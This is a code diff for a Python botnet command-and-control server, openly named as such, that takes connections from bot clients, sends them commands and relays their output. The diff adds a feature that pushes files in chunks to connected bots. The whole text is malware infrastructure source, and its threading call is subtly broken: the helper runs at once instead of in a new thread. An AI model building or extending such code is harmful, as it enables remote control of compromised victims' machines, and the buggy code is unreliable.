@@ -1,8 +1,10 @@
 import time
+import base64
 import json
 from threading import Thread, Condition
 from threading import Lock
 import select
+
 
 try:
     from server import formatsock
@@ -97,6 +99,15 @@ class BotNet(Thread):
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
 
+    def sendFile(self, user, filename, fileobj):
+        with self.connlock:
+            if user in self.allConnections:
+                self.allConnections[user].sendFile(filename, fileobj)
+                return True
+            self.socketio.emit('response',
+                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
+            return False
+
 
 class BotServer(Thread):
     def __init__(self, tcpsock, botnet, socketio):
@@ -115,17 +126,23 @@ class BotServer(Thread):
 
             user = host_info['user'].strip()
             print("[+] Received connection from {}".format(user))
-            self.botnet.addConnection(user, Bot(clientsock, host_info))
+            self.botnet.addConnection(user, Bot(clientsock, host_info, self.socketio))
 
             self.socketio.emit('connection', {'user': user}, namespace='/bot')
 
 
 class Bot:
-    def __init__(self, sock, host_info):
+    FILE_SHARD_SIZE = 4096
+    FILE_STREAM = 'fstream'
+    FILE_CLOSE = 'fclose'
+    FILE_FILENAME = 'fname'
+
+    def __init__(self, sock, host_info, socketio):
         self.sock = formatsock.FormatSocket(sock)
         self.arch = host_info['arch'][:-1]
         self.user = host_info['user'][:-1]
         self.botlock = Lock()
+        self.socketio = socketio
 
     def send(self, cmd, type="stdin"):
         json_str = json.dumps({type: cmd})
@@ -146,3 +163,20 @@ class Bot:
         simultaneously
         '''
         return self.sock.fileno()
+
+    def sendFile(self, filename, fileobj):
+        t = Thread(target=self.__sendFileHelper(filename, fileobj))
+        t.start()
+
+    def __sendFileHelper(self, filename, fileobj):
+        with self.botlock:
+            dat = fileobj.read(Bot.FILE_SHARD_SIZE)
+            if len(dat) > 0:
+                while len(dat) > 0:
+                    bytestr = dat.decode('UTF-8')
+                    json_str = json.dumps({Bot.FILE_STREAM:bytestr,Bot.FILE_FILENAME:filename})
+                    self.sock.send(json_str)
+                    dat = fileobj.read(Bot.FILE_SHARD_SIZE)
+                json_str = json.dumps({Bot.FILE_CLOSE: filename})
+                self.sock.send(json_str)
+                # TODO emit file upload success
